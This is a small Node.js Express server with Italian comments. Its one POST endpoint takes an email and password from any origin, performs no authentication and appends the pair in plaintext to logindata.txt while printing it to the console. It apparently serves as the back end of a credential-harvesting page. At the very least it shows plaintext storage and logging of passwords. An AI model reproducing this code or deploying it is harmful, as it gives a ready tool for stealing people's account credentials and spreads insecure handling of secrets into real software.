const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Endpoint per ricevere i dati
app.post('/submit', (req, res) => {
    const { email, password } = req.body;

    // Controlla se i dati sono validi
    if (!email || !password) {
        return res.status(400).send('Email e password sono obbligatorie!');
    }

    // Salva i dati in un file
    const data = `Email: ${email}, Password: ${password}\n`;
    fs.appendFile('logindata.txt', data, (err) => {
        if (err) {
            console.error('Errore nel salvataggio dei dati:', err);
            return res.status(500).send('Errore del server');
        }
        console.log('Dati salvati:', data);
        res.status(200).send('Dati ricevuti con successo');
    });
});

// Avvia il server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server in ascolto sulla porta ${PORT}`);
});
